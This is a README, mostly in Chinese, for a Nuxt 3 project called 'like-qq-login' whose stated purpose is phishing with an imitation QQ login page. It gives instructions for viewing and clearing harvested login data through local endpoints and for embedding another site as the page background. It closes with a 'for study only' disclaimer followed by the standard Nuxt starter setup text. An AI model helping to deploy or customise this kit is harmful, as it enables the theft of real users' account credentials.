# like-qq-login

## 作用
钓鱼

## 使用效果

## 获取钓到的数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/show
```
## 清空钓到的数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/delete
```

## 改变背景
```
// pages/index.vue 找到
<embed v-if="loadEmbed" src="/game.html" width="100%" class="h-screen"/>

// 换成你需要套的网页
<embed v-if="loadEmbed" src="http://youself.site" width="100%" class="h-screen"/>
```

## 声明
仅供学习参考


# Nuxt 3 Minimal Starter

Look at the [nuxt 3 documentation](https://v3.nuxtjs.org) to learn more.

## Setup

Make sure to install the dependencies:

```bash
# yarn
yarn install

# npm
npm install

# pnpm
pnpm install --shamefully-hoist
```

## Development Server

Start the development server on http://localhost:3000

```bash
npm run dev
```

## Production

Build the application for production:

```bash
npm run build
```

Locally preview production build:

```bash
npm run preview
```

Checkout the [deployment documentation](https://v3.nuxtjs.org/guide/deploy/presets) for more information.
